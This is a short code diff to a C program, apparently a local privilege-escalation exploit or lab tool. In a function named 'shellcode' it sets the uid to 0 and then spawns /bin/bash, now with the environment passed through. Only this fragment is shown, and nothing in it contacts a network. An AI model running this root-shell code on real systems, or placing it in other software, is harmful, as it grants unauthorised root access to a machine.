@@ -4,6 +4,8 @@
 #include <stdarg.h>
 #include <string.h>
 
+extern char **environ;
+
 void printf_success(char* format, ...) {
     printf("\x1b[1;32m");
     va_list args;
@@ -50,7 +52,7 @@ int give_me_uid(uid_t uid) {
 void shellcode(void) {
 	// Noreturn?
 	give_me_uid(0);
-	execve("/bin/bash", NULL, NULL);
+	execve("/bin/bash", NULL, environ);
 }
 int allow_send(void) {
 	give_me_uid(0);
@@ -93,7 +95,6 @@ int delete_wheel_user(void) {
 	return 0;
 }
 
-extern char **environ;
 
 int main(int argc, char *argv[]) {
 	if (argc != 2) {
